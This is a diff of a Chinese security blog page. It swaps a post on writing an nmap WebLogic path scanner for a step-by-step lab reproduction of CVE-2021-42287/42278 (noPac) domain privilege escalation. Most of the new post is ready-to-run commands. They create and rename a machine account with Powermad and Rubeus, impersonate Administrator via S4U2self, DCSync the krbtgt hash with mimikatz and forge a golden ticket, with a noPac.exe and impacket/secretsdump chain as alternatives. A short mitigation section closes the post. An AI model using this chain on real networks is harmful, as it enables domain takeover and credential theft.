@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>编写自己的nmap脚本 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="编写自己的nmap脚本 | 九世的博客">
+  <title>CVE-2021-42287/CVE-2021-42278 域内翻身做主人 | 九世的博客</title>
+  <meta name="keywords" content=" 域渗透 ">
+  <meta name="description" content="CVE-2021-42287/CVE-2021-42278 域内翻身做主人 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1909,9 +1909,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-编写自己的nmap脚本" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-CVE-2021-42287-CVE-2021-42278-域内翻身做主人" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">编写自己的nmap脚本</h1>
+        <h1 class="article-title">CVE-2021-42287/CVE-2021-42278 域内翻身做主人</h1>
     
     <div class="article-meta">
         
@@ -1920,14 +1920,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">域渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-07-10 14:09:32">2019-07-10 13:05</time>
+        创建时间:<time class="date" title="更新时间: 2021-12-15 01:28:38">2021-12-15 01:11</time>
         
     </div>
     <div class="article-meta">
@@ -1949,7 +1949,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境准备"><span class="toc-text">环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#需要学的"><span class="toc-text">需要学的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编写"><span class="toc-text">编写</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修复"><span class="toc-text">修复</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1964,181 +1964,64 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>nmap有很多自己的脚本，在渗透的时候都能帮上忙，那么如何自己写一个呢？<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1562749002996&amp;di=b9b3b409c2795b275891076ff7d1c944&amp;imgtype=0&amp;src=http%3A%2F%2Fattachments.gfan.com%2Fforum%2Fattachments2%2Fday_120501%2F1205012009f594464a3d69a145.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1562749002996&amp;di=b9b3b409c2795b275891076ff7d1c944&amp;imgtype=0&amp;src=http%3A%2F%2Fattachments.gfan.com%2Fforum%2Fattachments2%2Fday_120501%2F1205012009f594464a3d69a145.jpg"></p>
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><pre><code>nmap
-lua
-</code></pre><p>当然你也可以用kali(废话)</p>
-<h2 id="需要学的"><a href="#需要学的" class="headerlink" title="需要学的"></a>需要学的</h2><pre><code>lua基础 -&gt;菜鸟教程
-   -&gt;基本知识(变量)
-   -&gt;数据类型
-   -&gt;函数
-   -&gt;表
-   -&gt;数组
-   -&gt;字符串
-   -&gt;引入第三方模块
-   -&gt;文件操作
+        <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>原理：<br>创建一个机器用户 xxx 带$ 的 ，然后 这个用户的 sAMAccountName  == dc  获取一个DC的票据之后 再改回  sAMAccountName  ==  xxx 接着导入票据到本地<br>参考链接:<br><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html" target="_blank" rel="noopener">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a><br><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a></p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>yayi.local - windows server 2012(DC) HostName:WIN-5CHMN9C4UES<br>域内机器:win7<br>普通用户:jk Hxc123456</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>检测能否利用：<br>默认情况下，它是10，但可以更改，高于0 的任何内容都可以。</p>
+<pre><code>Get-DomainObject | findstr ms-ds-machine
+</code></pre><p><img src="https://static.aichat.net/chat/202112/e5f12adc-6349-4cc0-a7f9-fb0cbc3b1fb6.png" alt=""></p>
+<p>最后，我们需要检查默认情况下授予经过身份验证的用户的SeMachineAccountPrivilege</p>
+<pre><code>邪法:whoami /user #取出来的ID第4位进行-10  SID:S-1-5-21-2799505025-1944254007-2887416074-500
+ConvertFrom-SID S-1-5-11
+</code></pre><p><img src="https://static.aichat.net/chat/202112/3868861c-2415-4341-a30b-a72dad829516.png" alt=""></p>
+<p>手动利用:</p>
+<ul>
+<li>Powermad</li>
+<li>Rubeus<br><code>`</code><br>#创建机器用户<br>$password = ConvertTo-SecureString ‘ComputerPassword’ -AsPlainText -Force<br>New-MachineAccount -MachineAccount “Eva” -Password $($password) -Domain “yayi.local” -DomainController “WIN-5CHMN9C4UES.YAYI.local” -Verbose</li>
+</ul>
+<p>#清除SPN信息<br>Set-DomainObject “CN=Eva,CN=Computers,DC=yayi,DC=local” -Clear ‘serviceprincipalname’ -Verbose</p>
+<p>#重命名新建机器名为DC机器名<br>Set-MachineAccountAttribute -MachineAccount “Eva” -Value “WIN-5CHMN9C4UES” -Attribute samaccountname -Verbose</p>
+<p>#获取TGT<br>Rubeus.exe asktgt /user:”WIN-5CHMN9C4UES” /password:”ComputerPassword” /domain:”yayi.local” /dc:”WIN-5CHMN9C4UES.yayi.local” /nowrap</p>
+<p>#改回原来的计算机名<br>Set-MachineAccountAttribute -MachineAccount “Eva” -Value “Eva” -Attribute samaccountname -Verbose</p>
+<p>#Request S4U2self（获取票据）<br>Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-5CHMN9C4UES.yayi.local /self /altservice:LDAP/WIN-5CHMN9C4UES.yayi.local /ptt /ticket:doIFJDCCBSCgAwIBBaEDAgEWooIEODCCBDRhggQwMIIELKADAgEFoQwbCllBWUkuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnlheWkubG9jYWyjggP0MIID8KADAgESoQMCAQKiggPiBIID3o63EAl/yUgDHQmpBMWzqmvewt4GpUMUik4+5+s6gv16FRxloS4LplB1VwDs3iqATa4M5+Toko9kp5jHX9M0vGRekAlWb9VS+N97mEySMMQxAGIFhwV2xI4UAiZxiNLa6W7jGW9M5/z5StTXTcH7WVNOgA3NIxbGO8UWu+Ezk6wbcLKaA/Cm5hh7T2B2i8BrZzbD9uTSGXnJZRRv+HTpiv9+mq8FFPjO99qiu3VvK0XJYW3lKFvKLUVFwQidsUzvI2xD1jbtG6WADp9kbYoi5Tbj6PsWTXoU/rtaaZmIMdAfQgXrTIZob99HdwoKGS0ICNqhy1TGLRIWOgofopOhHlf99wbtVVneVytACl18O0QXnLP+BPePaSfJTXBdcdcQVBgZM1M7z/bQFqlNyCTDS2NQwgak0iDSHv/c0tstbxCqqEA1EQ8X28N1ENx0zgvPA4rOUNaQlBpZv9SSPQEkb0Ca13yHo9INdkZ4637YzGXVYuAXT2/wH2BQ7AVOQvetwlsY7CNJ2p5FcgYEYAwkmqurF/1DTMKJsRkWhstBWqvSXbHRsk0bxrC6uR7qX45rFweg7Q9FLI4t7Iv+pMFJjDUxJXRETaXq7ASHFpWULtmMB2LqTPc+igqUstiZOIAHTYN3xuShCyd1Hq17ISHl3iQOLK1BUhdJVgveaG+RguTvgGQ9Z6IyzqbORrnO6aA9JINoqhvgxTmeBfP7JmY5Ll8xHRMxMsEz+fD66RGAg6HVW4cwAbQLZePxuOBo/oclpsh8HPLuLEi7EKCgerSu/ANkIo2jzk9+RPl4+wABXriaRzn7sl+MRTV0r30jCXe3hwyii9QWw4MSzsRpR7zF2oD2n9yDS7wMjAj8/4YUwySnqyaerVsfqreHEN3CgIf+Fp4ZL8Dm8w1bMQ4msfJUm6+s51E8W7FzOOLXA18SD6Qb9xZOFqor+JapyeqCfJj20ShCGlxBA73srP5AkNbI8OduTP52GcvVYmNLT1jJI7LLi0gE4tVjE336H1KHkSukvfK1r2r3E1thiafWjQO1CMn1g8o0HwN3jW6LwdRGuhz2m+ocoq5KE3TxdYxI1vjFqlCKns9FkMWXslw5SytOqYtEicBUPNa17J3d3QadF7l7VYJWtEw6xAeB9F29WTaRaJCL8s7ghh06K27FwxLheIUukdwgOsMpJttkiJtUI+0u97gzQlIkSd2jb8tGdDnpRITi2LTwg1vvpmSvaGMQdZ+Oash27JHktjQwMHArrMM1mjtI1cQUgOdaRZGXpbdh7ThTdJwopaJQYdNsCIJ9poJNOhLXw+IM8m9RyDdxeKOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgEXoRIEELSllXk3Qm2tX3lpkSuPLWShDBsKWUFZSS5MT0NBTKIcMBqgAwIBAaETMBEbD1dJTi01Q0hNTjlDNFVFU6MHAwUAQOEAAKURGA8yMDIxMTIxMjIwNDE0MVqmERgPMjAyMTEyMTMwNjQxNDFapxEYDzIwMjExMjE5MjA0MTQxWqgMGwpZQVlJLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwp5YXlpLmxvY2Fs</p>
+<p>#DCSync (DCSync krbtgt hash伪造黄金票据等选择)<br>lsadump::dcsync /user:yayi\krbtgt</p>
+<pre><code>![](https://static.aichat.net/chat/202112/73d0b4c5-3853-413a-9afe-63796bfb270a.png)
 
-nmap内置API调用-&gt;官方文档
-  -&gt;nmap脚本的规范
-  -&gt;内置API如何去使用
-</code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>参考文章：<br>nmap API手册大全：<br><a href="https://nmap.org/nsedoc/lib/" target="_blank" rel="noopener">https://nmap.org/nsedoc/lib/</a></p>
-<p>Nmap编写自定义脚本的规则：<br><a href="https://nmap.org/book/nse-script-format.html" target="_blank" rel="noopener">https://nmap.org/book/nse-script-format.html</a><br><a href="https://nmap.org/book/nse-tutorial.html#nse-tutorial-rule" target="_blank" rel="noopener">https://nmap.org/book/nse-tutorial.html#nse-tutorial-rule</a></p>
-<p>来自车王的文章：<br><a href="https://zhuanlan.zhihu.com/p/27224457" target="_blank" rel="noopener">Nmap脚本编写 - 知乎</a></p>
-<p>概念图：<br><img src="https://s2.ax1x.com/2019/07/10/ZcnsU0.png" alt="ZcnsU0.png"></p>
-<h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>首先得导入nmap的内置模块<br>PS：你可以看上面的API手册来导入你要导入的lua脚本</p>
-<pre><code class="lua">local http=require &quot;http&quot;
-local shortport=require &quot;shortport&quot;
-local stdnse=require &quot;stdnse&quot;
-local string=require &quot;string&quot;
-local vulns=require &quot;vulns&quot;
-</code></pre>
-<p>在漏洞说明里面写点东西<br><img src="https://s2.ax1x.com/2019/07/10/ZcueZn.png" alt="ZcueZn.png"></p>
-<pre><code class="lua">description=[[
-Grabbing a Site for Subdomain Names
-]]
-</code></pre>
-<p>作者信息与脚本分类</p>
-<pre><code class="lua">author=&quot;Jiushi&quot; --作者
-license=&quot;Same as Nmap--See https://nmap.org/book/man-legal.html&quot; --nmap证书
-categories={&quot;default&quot;} --脚本的分类
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/07/10/ZcusLd.png" alt=""></p>
-<p>规则函数</p>
-<pre><code class="lua">portrule=function(host,port)
-    set_port=stdnse.get_script_args(&quot;port&quot;) --选择参数
-    if (type(set_port)~=&quot;nil&quot;) then
-        local auth_port={number=tonumber(set_port),protocol=&quot;tcp&quot;}
-        local identd=nmap.get_port_state(host,auth_port)
-        return identd.number==tonumber(set_port) and identd.state==&quot;open&quot; and port.protocol==&quot;tcp&quot;
+![](https://static.aichat.net/chat/202112/c9af7c4c-52ef-420c-9a0e-9a5df398433c.png)
 
-    end
-end
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/07/10/Zcu7es.png" alt=""><br>PS:portrule函数是在每一个端口运行一次这个脚本，所以用的时候得指定脚本</p>
-<p>行动函数-&gt;action</p>
-<pre><code class="lua">action=function(host,port)
-    local ht=stdnse.get_script_args(&quot;protocol&quot;)
-    local path={&quot;/console/login/LoginForm.jsp&quot;,&quot;/wls-wsat/CoordinatorPortType&quot;,&quot;/_async/AsyncResponseService&quot;,&quot;/ws_utc/config.do&quot;,&quot;/uddiexplorer&quot;}
-    local urls=string.format(&quot;%s://%s&quot;,ht,host[&#39;ip&#39;])
-    local jiances=jianche(urls,path) --调用一个自定义函数
-    return jiances
+![](https://static.aichat.net/chat/202112/45b40aad-892e-408f-8390-a5f99aec132f.png)
 
-end
-</code></pre>
-<p><img src="https://s2.ax1x.com/2019/07/10/ZcKa0s.png" alt=""><br>官方写的例子-&gt;</p>
-<pre><code class="lua">action = function(host, port)
-        local owner = &quot;&quot;
+![](https://static.aichat.net/chat/202112/7c05acaa-c3a9-4655-896d-dd47e4d1b8de.png)
 
-        local client_ident = nmap.new_socket()
-        local client_service = nmap.new_socket()
+票据检查:
+![](https://static.aichat.net/chat/202112/7c696639-6049-4a03-8db5-23fae9abaa96.png)
 
-        local catch = function()
-                client_ident:close()
-                client_service:close()
-        end
+![](https://static.aichat.net/chat/202112/e5385b26-cb22-439a-9bc3-7a5269071b64.png)
 
-        local try = nmap.new_try(catch)
+![](https://static.aichat.net/chat/202112/84071697-f640-4aee-afbe-e4f4e5933f23.png)
 
-        try(client_ident:connect(host.ip, 113))
-        try(client_service:connect(host.ip, port.number))
+nopac:
+https://github.com/cube0x0/noPac
 
-        local localip, localport, remoteip, remoteport =
-                try(client_service:get_info())
+</code></pre><p>noPac.exe -dc WIN-5CHMN9C4UES.YAYI.local -mAccount evilpc -mPassword 123.com /service ldap /ptt<br>Mimikatz “lsadump::dcsync /user:yayi\krbtgt”</p>
+<p>92b27a8d7877a2e27cf095e9c136b3c3<br>90e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36</p>
+<p>mimikatz “kerberos::golden /domain:yayi.local /sid:S-1-5-21-2799505025-1944254007-2887416074 /aes256:90e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36 /user:sb /ptt” exit</p>
+<pre><code>![](https://static.aichat.net/chat/202112/c05157b5-da40-47ad-8a5c-334e837c708e.png)
 
-        local request = port.number .. &quot;, &quot; .. localport .. &quot;\r\n&quot;
+![](https://static.aichat.net/chat/202112/ec8e38af-49e8-4c8a-9197-e3e01fb14dfa.png)
 
-        try(client_ident:send(request))
+![](https://static.aichat.net/chat/202112/612200c3-1100-4c1a-8adf-940e01b3b555.png)
 
-        owner = try(client_ident:receive_lines(1))
+![](https://static.aichat.net/chat/202112/2cfb451d-7577-4f8d-af68-4d7ed287873b.png)
 
-        if string.match(owner, &quot;ERROR&quot;) then 
-                owner = nil
-        else
-                owner = string.match(owner,
-                        &quot;%d+%s*,%s*%d+%s*:%s*USERID%s*:%s*.+%s*:%s*(.+)\r?\n&quot;)
-        end
-
-        try(client_ident:close())
-        try(client_service:close())
-
-        return owner
-end
-</code></pre>
-<p>链接到此文章：<a href="https://nmap.org/book/nse-tutorial.html#nse-tutorial-rule" target="_blank" rel="noopener">传送门</a></p>
-<p>完整代码：</p>
-<pre><code class="lua">--author:jiushi
---date:19-7-10
---time:早上9:28
-
-local http=require &quot;http&quot;
-local shortport=require &quot;shortport&quot;
-local stdnse=require &quot;stdnse&quot;
-local string=require &quot;string&quot;
-local vulns=require &quot;vulns&quot;
-
-description=[[
-Weblogic path scanning
-]]
-
---nmap --script=weblogic_query --script-args port=&lt;weblogic_port&gt;,protocol=&lt;http/https&gt; IP
---Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-10 12:59 CST
---Nmap scan report for 192.168.241.140
---Host is up (0.00021s latency).
-
---PORT     STATE SERVICE
---7001/tcp open  afs3-callback
---| weblogic_query:
---|   [200]: http://192.168.241.140:7001/console/login/LoginForm.jsp
---|   [200]: http://192.168.241.140:7001/wls-wsat/CoordinatorPortType
---|   [200]: http://192.168.241.140:7001/_async/AsyncResponseService
---|_  [200]: http://192.168.241.140:7001/uddiexplorer
-
---Nmap done: 1 IP address (1 host up) scanned in 2.45 seconds
-
-
-author=&quot;Jiushi&quot;
-license=&quot;Same as Nmap--See https://nmap.org/book/man-legal.html&quot;
-categories={&quot;default&quot;}
-
-portrule=function(host,port)
-    set_port=stdnse.get_script_args(&quot;port&quot;)
-    if (type(set_port)~=&quot;nil&quot;) then
-        local auth_port={number=tonumber(set_port),protocol=&quot;tcp&quot;}
-        local identd=nmap.get_port_state(host,auth_port)
-        return identd.number==tonumber(set_port) and identd.state==&quot;open&quot; and port.protocol==&quot;tcp&quot;
-
-    end
-end
-
-function jianche(url,path)
-    local demo={}
-    local headers={header={}}
-    headers[&#39;header&#39;][&#39;User-Agent&#39;]=&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&quot;
-    for p in pairs(path) do
-        local urls=string.format(&quot;%s:%s%s&quot;,url,set_port,path[p])
-        local request=http.get_url(urls,headers) --发送get请求，有路径的url得用get_url()请求否则会报错
-        if (request.status==200 and string.match(request.body,&quot;Not Found&quot;)==nil) then
-            table.insert(demo,string.format(&quot;[%s]: %s&quot;,request.status,urls))
-        end
-
-    end
-    return demo
-end
-
-action=function(host,port)
-    local ht=stdnse.get_script_args(&quot;protocol&quot;)
-    local path={&quot;/console/login/LoginForm.jsp&quot;,&quot;/wls-wsat/CoordinatorPortType&quot;,&quot;/_async/AsyncResponseService&quot;,&quot;/ws_utc/config.do&quot;,&quot;/uddiexplorer&quot;}
-    local urls=string.format(&quot;%s://%s&quot;,ht,host[&#39;ip&#39;])
-    local jiances=jianche(urls,path)
-    return jiances
-
-end
-</code></pre>
-<p>PS:像官方文档中选项之类的东西，得用二维数组来设置<br><img src="https://s2.ax1x.com/2019/07/10/ZcKjAI.png" alt="ZcKjAI.png"></p>
-<p>测试效果：<br><img src="https://s2.ax1x.com/2019/07/10/ZcMavD.png" alt="ZcMavD.png"></p>
-<p><img src="https://s2.ax1x.com/2019/07/10/ZcMcPP.png" alt="ZcMcPP.png"></p>
-<p>动态gif<br><img src="https://s2.ax1x.com/2019/07/10/ZcQtds.gif" alt="ZcQtds.gif"></p>
-<p>END</p>
+impacket复现，没成功
+</code></pre><p>python3 addcomputer.py -computer-name fakename -computer-pass ‘Passw0rd!’ -dc-ip 192.168.93.136 -dc-host WIN-5CHMN9C4UES.yayi.local yayi.local/jk:’Hxc123456’</p>
+<p>python3 renameMachine.py yayi.local/jk:’Hxc123456’ -dc-ip 192.168.93.136 -current-name ‘fakename$’ -new-name WIN-5CHMN9C4UES</p>
+<p>python3 getTGT.py yayi.local/WIN-5CHMN9C4UES:’Passw0rd!’ -dc-ip 192.168.93.136</p>
+<p>python3 renameMachine.py yayi.local/jk:’Hxc123456’ -dc-ip 192.168.93.136 -current-name ‘WIN-5CHMN9C4UES’ -new-name fakename$</p>
+<p>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.yayi.local -impersonate admin -dc-ip 192.168.93.136 yayi.local/fakename$:passw0rd!</p>
+<p>python3 secretsdump.py -k -no-pass WIN-5CHMN9C4UES.yayi.local -just-dc<br><code>`</code></p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>解决此问题的最佳方法是安装 Microsoft 补丁 ( KB5008602 )，此补丁修复了 PAC 混淆的问题，并修复了由早期 KB5008380 补丁创建的 S4U2self 的此问题。<br>将机器帐户配额设置为0是阻止低权限用户创建机器帐户的快速而简单的解决方法，另一个相关的解决方法是从SeMachineAccountPrivilege 中删除Authenticated Users并添加域管理员或另一组允许的帐户。<br>由各种步骤引起的多个事件对于确定执行此攻击的尝试非常有用。确定这些事件的功劳完全归功于Andrew Schwartz，我只是在执行攻击后将我的日志发送给他。</p>
+<p><img src="https://static.aichat.net/chat/202112/59927b79-aa84-4ff0-8b3f-47ea959f0acd.png" alt=""></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -2148,12 +2031,12 @@ end
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>编写自己的nmap脚本</p>
+    <p><span class="copy-title">文章标题:</span>CVE-2021-42287/CVE-2021-42278 域内翻身做主人</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-07-10, 13:05:03</p>
-    <p><span class="copy-title">最后更新:</span>2019-07-10, 14:09:32</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/81575c3f.html" title="编写自己的nmap脚本">http://422926799.github.io/posts/81575c3f.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-12-15, 01:11:47</p>
+    <p><span class="copy-title">最后更新:</span>2021-12-15, 01:28:38</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/f591678b.html" title="CVE-2021-42287/CVE-2021-42278 域内翻身做主人">http://422926799.github.io/posts/f591678b.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
